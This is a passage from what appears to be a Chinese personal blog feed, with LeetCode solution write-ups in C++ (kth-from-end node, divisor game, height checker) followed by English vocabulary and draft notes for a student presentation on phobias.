<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历链表，把每个结点指针存到vector容器中，返回倒数第k个节点可以直接下标获取。</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败54.44%，内存消耗10.9M，击败5.06%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">getKthFromEnd</span><span class="params">(ListNode* head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//结点指针容器</span></span><br><span class="line">        <span class="built_in">vector</span>&lt;ListNode*&gt; tmp;</span><br><span class="line">        <span class="keyword">while</span>(head)&#123;</span><br><span class="line">            tmp.push_back(head);</span><br><span class="line">            head=head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tmp[tmp.size()-k];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，也比较简单，没啥可说的。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>除数博弈</title>
    <url>/2020/11/21/%E9%99%A4%E6%95%B0%E5%8D%9A%E5%BC%88/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/divisor-game/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>爱丽丝和鲍勃一起玩游戏，他们轮流行动。爱丽丝先手开局。</p>
<p>最初，黑板上有一个数字 $N$ 。在每个玩家的回合，玩家需要执行以下操作：</p>
<p>选出任一 $x$，满足 $0 &lt; x &lt; N$ 且 $N % x == 0$ 。<br>用 $N - x $替换黑板上的数字 $N$ 。<br>如果玩家无法执行这些操作，就会输掉游戏。</p>
<p>只有在爱丽丝在游戏中取得胜利时才返回 $True$，否则返回 $False$。假设两个玩家都以最佳状态参与游戏。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：2</span><br><span class="line">输出：true</span><br><span class="line">解释：爱丽丝选择 1，鲍勃无法进行操作。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：3</span><br><span class="line">输出：false</span><br><span class="line">解释：爱丽丝选择 1，鲍勃也选择 1，然后爱丽丝无法进行操作。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>1 &lt;= N &lt;= 1000</code></li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>两个玩家都是最佳状态,也就是说两个玩家每次选择都是最优解,只有这样才可能给定一个数字就有一个固定的结局.考虑游戏的结束条件,最后一次选择成功面临的N一定是2,只有为2然后玩家选择了1对方就会输.也就是说最后谁抢到了2谁赢.</p>
<ul>
<li>如果开局N为偶数,那么先手可以选择1,然后后手就要面临奇数N,无论后手怎么选择,先手下一次面临的N还是偶数,那么先手只要继续选择1就可以一直保证N为偶数时选择直到最后一回合面临2然后赢到比赛.</li>
<li>如果开局N为奇数,因为奇数不可能有偶数因子,所以奇数(N)-奇数(x)=偶数(后手N),那么一定时后手赢下比赛.</li>
</ul>
<p>也就是说只要判断N是否是偶数,是偶数先手必赢返回true,是奇数后手必赢返回奇数.</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.1M，击败32.56%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">divisorGame</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> N%<span class="number">2</span>==<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/divisor-game/solution/chu-shu-bo-yi-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：找规律</strong><br><strong>思路与算法</strong></p>
<p>博弈类的问题常常让我们摸不着头脑。当我们没有解题思路的时候，不妨试着写几项试试：</p>
<ul>
<li>$N = 1$ 的时候，区间 (0,1) 中没有整数是 n 的因数，所以此时 Alice 败。</li>
<li>$N = 2$的时候，Alice 只能拿 $1$，$N$ 变成 $1$，Bob 无法继续操作，故 Alice 胜。</li>
<li>$N = 3$ 的时候，Alice 只能拿 1，$N$变成 $2$，根据 $N = 2$ 的结论，我们知道此时 Bob 会获胜，Alice 败。</li>
<li>$N = 4$ 的时候，Alice 能拿 $1$ 或 $2$，如果 Alice 拿 $1$，根据 $N=3$ 的结论，Bob 会失败，Alice 会获胜。</li>
<li>$N = 5$的时候，Alice 只能拿 $1$，根据 $N = 4$的结论，Alice 会失败。</li>
<li>……</li>
</ul>
<p>写到这里，也许你有了一些猜想。没关系，请大胆地猜想，在这种情况下大胆地猜想是 AC 的第一步。也许你会发现这样一个现象：<strong>N 为奇数的时候 Alice（先手）必败，N 为偶数的时候 Alice 必胜</strong>。 这个猜想是否正确呢？下面我们来想办法证明它。</p>
<p><strong>证明</strong></p>
<p>$N = 1$ 和 $N = 2$ 时结论成立。</p>
<p>N &gt; 2 时，假设 $N \leq k$ 时该结论成立，则 $N = k + 1$ 时：</p>
<p>如果 $k$ 为偶数，则 $k + 1$为奇数，x 是 $k + 1$的因数，只可能是奇数，而奇数减去奇数等于偶数，且 $k + 1 - x \leq k$，故轮到 Bob 的时候都是偶数。而根据我们的猜想假设 $N\le k$ 的时候偶数的时候先手必胜，故此时无论 Alice 拿走什么，Bob 都会处于必胜态，所以 Alice 处于必败态。<br>如果 k为奇数，则 $k + 1$ 为偶数，$x$ 可以是奇数也可以是偶数，若 Alice 减去一个奇数，那么 $k + 1 - x$ 是一个小于等于 $k$ 的奇数，此时 Bob 占有它，处于必败态，则 Alice 处于必胜态。</p>
<p>综上所述，这个猜想是正确的。</p>
<p>下面是代码实现。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.1M，击败32.56%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">divisorGame</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> N % <span class="number">2</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(1)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<p><strong>方法二：递推</strong><br><strong>思路与算法</strong></p>
<p>在「方法一」中，我们写出了前面几项的答案，在这个过程中我们发现，Alice 处在 $N = k$ 的状态时，他（她）做一步操作，必然使得 Bob 处于 $N = m (m &lt; k)$的状态。因此我们只要看是否存在一个 $m$ 是必败的状态，那么 Alice 直接执行对应的操作让当前的数字变成 $m$，Alice 就必胜了，如果没有任何一个是必败的状态的话，说明 Alice 无论怎么进行操作，最后都会让 Bob 处于必胜的状态，此时 Alice 是必败的。</p>
<p>结合以上我们定义 $f[i]$表示当前数字 $i$ 的时候先手是处于必胜态还是必败态，$\textit{true}$ 表示先手必胜，$\textit{false}$表示先手必败，从前往后递推，根据我们上文的分析，枚举 $i$在 $(0, i)$ 中 $i$ 的因数 $j$，看是否存在 $f[i-j]$为必败态即可。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败34.29%，内存消耗6.6M，击败5.05%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">divisorGame</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">f</span><span class="params">(N + <span class="number">5</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        f[<span class="number">1</span>] = <span class="literal">false</span>;</span><br><span class="line">        f[<span class="number">2</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= N; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i % j == <span class="number">0</span> &amp;&amp; !f[i - j]) &#123;</span><br><span class="line">                    f[i] = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> f[N];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n^2)$。递推的时候一共有 $n$ 个状态要计算，每个状态需要 $O(n)$ 的时间枚举因数，因此总时间复杂度为 $O(n^2)$。</li>
<li>空间复杂度：$O(n)$。我们需要 $O(n)$ 的空间存储递推数组 $f$ 的值。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路一毛一样，得意😜，这不双百？？我真的觉得是击败的比例，其他的都是和我一样的。。。</p>
<p>方法一给出了归纳法证明猜想，我是直接叙述的（学术水平不到位，讲不出来。。。），方法二递推没咋看，效率也不高，累了，溜了溜了。。。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>高度检查器</title>
    <url>/2020/11/16/%E9%AB%98%E5%BA%A6%E6%A3%80%E6%9F%A5%E5%99%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/height-checker/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>学校在拍年度纪念照时，一般要求学生按照 <strong>非递减</strong> 的高度顺序排列。</p>
<p>请你返回能让所有学生以 <strong>非递减</strong> 高度排列的最小必要移动人数。</p>
<p>注意，当一组学生被选中时，他们之间可以以任何可能的方式重新排序，而未被选中的学生应该保持不动。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：heights &#x3D; [1,1,4,2,1,3]</span><br><span class="line">输出：3 </span><br><span class="line">解释：</span><br><span class="line">当前数组：[1,1,4,2,1,3]</span><br><span class="line">目标数组：[1,1,1,2,3,4]</span><br><span class="line">在下标 2 处（从 0 开始计数）出现 4 vs 1 ，所以我们必须移动这名学生。</span><br><span class="line">在下标 4 处（从 0 开始计数）出现 1 vs 3 ，所以我们必须移动这名学生。</span><br><span class="line">在下标 5 处（从 0 开始计数）出现 3 vs 4 ，所以我们必须移动这名学生。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：heights &#x3D; [5,1,2,3,4]</span><br><span class="line">输出：5</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：heights &#x3D; [1,2,3,4,5]</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>1 &lt;= heights.length &lt;= 100</code></li>
<li><code>1 &lt;= heights[i] &lt;= 100</code></li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>当前数组和排序后的数组进行比较，元素不相同时则表示当前位置学生要移动，统计不同的元素个数。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败85.51%，内存消耗8.4M，击败10.90%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">heightChecker</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; heights)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tmp;</span><br><span class="line">        tmp=heights;</span><br><span class="line">        sort(heights.begin(),heights.end());</span><br><span class="line">        <span class="comment">//当前数组和排序后的数组进行比较，元素不相同时则表示当前位置学生要移动</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;heights.size();++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmp[i]!=heights[i])&#123;</span><br><span class="line">                ++result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，也比较简单。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>High Anxiety phobias</title>
    <url>/2020/11/19/AcademicEnglish-presentation/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>There are some materials for presentation PPT.</p>
<a id="more"></a>
<p>幽闭恐惧症</p>
<p>社交恐惧症</p>
<p>密集恐惧症（Trypophobia）<a href="https://www.verywellmind.com/trypophobia-4687678">资料</a></p>
<p>广场恐惧症</p>
<p>恐高症（acrophobia）</p>
<p>综述类型？</p>
<p>重点讲某一种类型？</p>
<h3 id="单词"><a href="#单词" class="headerlink" title="单词"></a>单词</h3><p><strong>anxiety</strong><br>英 [æŋˈzaɪəti]   美 [æŋˈzaɪəti]<br>n.<br>焦虑;忧虑;担心;害怕;渴望</p>
<p><strong>phobia</strong><br>英 [ˈfəʊbiə]   美 [ˈfoʊbiə]<br>n.<br>恐怖症，恐惧症(无名的极度恐惧);(构成名词)对…的恐惧症</p>
<p><strong>phobias</strong><br>英 [ˈfəʊbɪəz]   美 [ˈfoʊbiəz]<br>n.<br>恐怖症，恐惧症(无名的极度恐惧);(构成名词)对…的恐惧症<br>phobia的复数</p>
<p><strong>symptoms</strong><br>英 [ˈsɪmptəmz]   美 [ˈsɪmptəmz]<br>n.<br>症状;征候;征兆<br>symptom的复数</p>
<p><strong>irrational</strong><br>英 [ɪˈræʃənl]   美 [ɪˈræʃənl]<br>adj.<br>不合逻辑的;没有道理的<br>n.<br>无理数;无理性的生物</p>
<p><strong>sufferer</strong><br>英 [ˈsʌfərə(r)]   美 [ˈsʌfərər]<br>n.<br>患病者;受苦者;受难者</p>
<p>8.7%读作eight point seven percent</p>
<p><strong>exposure</strong><br>英 [ɪkˈspəʊʒə(r)]   美 [ɪkˈspoʊʒər]<br>n.<br>面临，遭受(危险或不快);揭露;(在电视、报纸等上的)亮相，被报道</p>
<p><strong>Dizziness</strong><br>英 [ˈdɪzinəs]   美 [ˈdɪzinəs]<br>晕厥;头晕;眩晕;头昏;頭暈</p>
<p><strong>Trembling</strong><br>英 [ˈtremblɪŋ]   美 [ˈtremblɪŋ]<br>颤抖;发抖;颤抖的;哆嗦;战栗</p>
<p><strong>nausea</strong><br>英 [ˈnɔːziə]   美 [ˈnɔːziə]<br>n.<br>恶心;作呕;反胃</p>
<p><strong>escalate</strong><br>英 [ˈeskəleɪt]   美 [ˈeskəleɪt]<br>v.<br>(使)逐步扩大，不断恶化，加剧</p>
<p><strong>isolate</strong><br>英 [ˈaɪsəleɪt]   美 [ˈaɪsəleɪt]<br>v.<br>(使)隔离，孤立，脱离;将…剔出(以便看清和单独处理);使(某物质、细胞等)分离;使离析</p>
<p><strong>hypochondriasis</strong></p>
<p>疑病症，</p>
<p><strong>illnesses</strong><br>英 [ˈɪlnɪsɪz]   美 [ˈɪlnəsɪz]<br>n.<br>(身体或精神上的)疾病，病;(某种)病;患病期<br>illness的复数</p>
<p><strong>imminent</strong><br>英 [ˈɪmɪnənt]   美 [ˈɪmɪnənt]<br>adj.<br>即将发生的;临近的<br>派生词： imminence n. imminently adv.</p>
<p><strong>Psychiatric</strong><br>英 [ˌsaɪkiˈætrɪk]   美 [ˌsaɪkiˈætrɪk]<br>精神医学;精神病科;精神病学;精神性;精神科</p>
<p><strong>categorizes</strong><br>英 [ˈkætəɡəraɪzɪz]   美 [ˈkætəɡəraɪzɪz]<br>v.<br>将…分类;把…加以归类<br>categorize的第三人称单数</p>
<p><strong>Agoraphobia</strong><br>英 [ˌæɡərəˈfəʊbiə]   美 [ˌæɡərəˈfoʊbiə]<br>广场恐怖症;广场恐惧症;场所恐惧症;惧旷症;广场恐怖</p>
<p><strong>inescapable</strong><br>英 [ˌɪnɪˈskeɪpəbl]   美 [ˌɪnɪˈskeɪpəbl]<br>adj.<br>不可避免的;逃避不了的;不能忽视的<br>派生词： inescapably adv.</p>
<p><strong>phobic</strong><br>英 [ˈfəʊbɪk]   美 [ˈfoʊbɪk]<br>n.<br>恐惧症患者;极端仇视者;恐惧…的;仇恨…的<br>adj.<br>病态性恐惧的</p>
<p><strong>pervasive</strong><br>英 [pəˈveɪsɪv]   美 [pərˈveɪsɪv]<br>adj.<br>遍布的;充斥各处的;弥漫的<br>派生词： pervasively adv. pervasiveness n.</p>
<p><strong>overwhelming</strong><br>英 [ˌəʊvəˈwelmɪŋ]   美 [ˌoʊvərˈwelmɪŋ]<br>adj.<br>巨大的;压倒性的;无法抗拒的<br>v.<br>(感情或感觉)充溢，难以禁受;压倒;击败;征服;压垮;使应接不暇<br>overwhelm的现在分词</p>
<p><strong>rodents</strong><br>英 [ˈrəʊdənts]   美 [ˈroʊdənts]<br>n.<br>啮齿动物<br>rodent的复数</p>
<p><strong>tornadoes</strong><br>英 [tɔːˈneɪdəʊz]   美 [tɔrˈneɪdoʊz]<br>n.<br>龙卷风;旋风<br>tornado的复数</p>
<p><strong>mudslides</strong><br>英 [ˈmʌdslaɪdz]   美 [ˈmʌdslaɪdz]<br>n.<br>泥流<br>mudslide的复数</p>
<p><strong>Arachnophobia</strong><br>英 [əˌræknəˈfəʊbiə]   美 [əˌræknəˈfoʊbiə]<br>小魔煞;蜘蛛恐惧症;小魔星;蜘蛛克星;蜘蛛恐怖症</p>
<p><strong>Claustrophobia</strong><br>英 [ˌklɔːstrəˈfəʊbiə]   美 [ˌklɔːstrəˈfoʊbiə]<br>幽闭恐惧症;幽闭恐怖症;亲密;幽闭恐惧;幽閉恐懼症</p>
<p><strong>instances</strong><br>英 [ˈɪnstənsɪz]   美 [ˈɪnstənsɪz]<br>n.<br>例子;事例;实例<br>v.<br>举…为例<br>instance的第三人称单数和复数</p>
<p><strong>strategically</strong><br>英 [strəˈtiːdʒɪkəli]   美 [strəˈtidʒɪkli]<br>adv.<br>战略上</p>
<p><strong>relaxation</strong><br>英 [ˌriːlækˈseɪʃn]   美 [ˌriːlækˈseɪʃn]<br>n.<br>放松;休息;消遣;用于放松消遣的时间;休闲活动;娱乐活动;(对规章制度的)放宽</p>
<p><strong>techniques</strong><br>英 [tɛkˈniːks]   美 [tɛkˈniks]<br>n.<br>技巧;技艺;工艺;技术;技能<br>technique的复数</p>
<p><strong>incompatible</strong><br>英 [ˌɪnkəmˈpætəbl]   美 [ˌɪnkəmˈpætəbl]<br>adj.<br>(与某事物)不一致，不相配;(与某人)合不来，不能和睦相处;(与某物)不匹配;配伍禁忌的;不兼容;互斥的<br>派生词： incompatibility n.</p>
<p><strong>diminishes</strong><br>英 [dɪˈmɪnɪʃɪz]   美 [dɪˈmɪnɪʃɪz]<br>v.<br>减少;(使)减弱，缩减;降低;贬低;贬损;轻视<br>diminish的第三人称单数</p>
<p><strong>adolescents</strong><br>英 [ˌædəʊˈlɛsnts]   美 [ˌædəˈlɛsənts]<br>n.<br>青少年<br>adolescent的复数</p>
<p><strong>potentially</strong><br>英 [pə’tenʃəli]   美 [pə’tenʃəli]<br>adv.<br>潜在地</p>
<p><strong>antidepressant</strong><br>英 [ˌæntidɪˈpresnt]   美 [ˌæntidɪˈpresnt]<br>n.<br>抗抑郁药<br>adj.<br>抗抑郁的<br>派生词： antidepressant adj.</p>
<p><strong>cognitive</strong><br>英 [ˈkɒɡnətɪv]   美 [ˈkɑːɡnətɪv]<br>adj.<br>认知的;感知的;认识的</p>
<p><strong>therapy</strong><br>英 [ˈθerəpi]   美 [ˈθerəpi]<br>n.<br>治疗;疗法</p>
<p><strong>licensed</strong><br>英 [ˈlaɪsnst]   美 [ˈlaɪsnst]<br>adj.<br>有售酒许可的;获准售酒的;获准拥有的;得到正式许可的<br>v.<br>批准;许可<br>license的过去分词和过去式</p>
<p><strong>therapist</strong><br>英 [ˈθerəpɪst]   美 [ˈθerəpɪst]<br>n.<br>(某治疗法的)治疗专家</p>
<p><strong>psychiatrist</strong><br>英 [saɪˈkaɪətrɪst]   美 [saɪˈkaɪətrɪst]<br>n.<br>精神病学家;精神科医生</p>
<p><strong>psychology</strong><br>英 [saɪˈkɒlədʒi]   美 [saɪˈkɑːlədʒi]<br>n.<br>心理学;心理;心理特征;心理影响</p>
<p><strong>psychological</strong><br>英 [ˌsaɪkəˈlɒdʒɪkl]   美 [ˌsaɪkəˈlɑːdʒɪkl]<br>adj.<br>心灵的;心理的;精神上的;心理学的;关于心理学的</p>
<p><strong>psychologist</strong><br>英 [saɪˈkɒlədʒɪst]   美 [saɪˈkɑːlədʒɪst]<br>n.<br>心理学家;心理学研究者</p>
<p><strong>intense</strong><br>英 [ɪnˈtens]   美 [ɪnˈtens]<br>adj.<br>很大的;十分强烈的;严肃紧张的;激烈的;有强烈感情(或意见、想法)的;尖锐的;热切的</p>
<p><strong>manifests</strong><br>英 [ˈmænɪfests]   美 [ˈmænɪfests]<br>v.<br>表明，清楚显示(尤指情感、态度或品质);显现;使人注意到<br>manifest的第三人称单数</p>
<p><strong>Agoraphobia</strong><br>英 [ˌæɡərəˈfəʊbiə]   美 [ˌæɡərəˈfoʊbiə]<br>广场恐怖症;广场恐惧症;场所恐惧症;惧旷症;广场恐怖</p>
<p><strong>incorporates</strong><br>英 [ɪnˈkɔːpəreɪts]   美 [ɪnˈkɔːrpəreɪts]<br>v.<br>将…包括在内;包含;吸收;使并入;注册成立<br>incorporate的第三人称单数</p>
<p><strong>triggers</strong><br>英 [ˈtrɪɡəz]   美 [ˈtrɪɡərz]<br>n.<br>(枪的)扳机;(尤指引发不良反应或发展的)起因，诱因;触发器;引爆器<br>v.<br>发动;引起;触发;开动;起动<br>trigger的第三人称单数和复数</p>
<p><strong>composite</strong><br>英 [ˈkɒmpəzɪt]   美 [kəmˈpɑːzət]<br>adj.<br>合成的;混成的;复合的<br>n.<br>合成物;混合物;复合材料</p>
<p><strong>stimuli</strong><br>英 [ˈstɪmjʊlaɪ]   美 [ˈstɪmjəˌlaɪ]<br>n.<br>促进因素;激励因素;刺激物;(使生物产生反应的)刺激<br>stimulus的复数</p>
<p><strong>ultimately</strong><br>英 [ˈʌltɪmətli]   美 [ˈʌltɪmətli]<br>adv.<br>最终;最后;终归;最基本地;根本上</p>
<p><strong>Hydrophobia</strong><br>英 [ˌhaɪdrəˈfəʊbiə]   美 [ˌhaɪdrəˈfoʊbiə]<br>恐水症;恐水病;狂犬病;又称恐水病;泼水</p>
<p><strong>traumatic</strong><br>英 [trɔːˈmætɪk]   美 [traʊˈmætɪk]<br>adj.<br>痛苦的;极不愉快的;创伤的;外伤的;损伤的<br>派生词： traumatically adv.</p>
<p><strong>symptoms</strong><br>英 [ˈsɪmptəmz]   美 [ˈsɪmptəmz]<br>n.<br>症状;征候;征兆<br>symptom的复数</p>
<p><strong>diagnosed</strong><br>英 [ˈdaɪəɡnəʊzd]   美 [ˌdaɪəɡˈnoʊst]<br>v.<br>诊断(疾病);判断(问题的原因)<br>diagnose的过去分词和过去式</p>
<h1 id="PPT"><a href="#PPT" class="headerlink" title="PPT"></a>PPT</h1><ol>
<li>What a phobia is?</li>
<li><del>The  classification of phobia.</del></li>
<li><del>The causes of phobias?</del></li>
<li>Phobia Symptoms.</li>
<li>Types of Phobias.</li>
<li>Phobia Treatments.</li>
</ol>
<h5 id="What-a-phobia-is"><a href="#What-a-phobia-is" class="headerlink" title="What a phobia is?"></a>What a phobia is?</h5><p>A phobia is an intense fear of a particular situation or object that is generally unreasonable in nature and which often has a direct impact on a person’s life. As a psychological consideration,the impact this fear has on the life of a person is typically a major factor in determining if a particular fear is mild and common or severe enough to constitute a form of mental illness. A phobia is typically considered to be a specific aspect of anxiety disorder,as the reaction caused when confronted with the object or source of fear is similar to anxiety.</p>
<p>恐惧症是指对自然界中某一个场景或者物体有一种强烈的恐惧，这种恐惧直接影响人们的生活。从心理学来讲，这种恐惧对人们生活的影响决定了这种特别的恐惧是温和普遍的还是足够严重能够导致精神疾病。恐惧症主要被认为是焦虑症的具体影响，恐惧症面对物体或恐惧来源时产生的反应和焦虑症是相似的。</p>
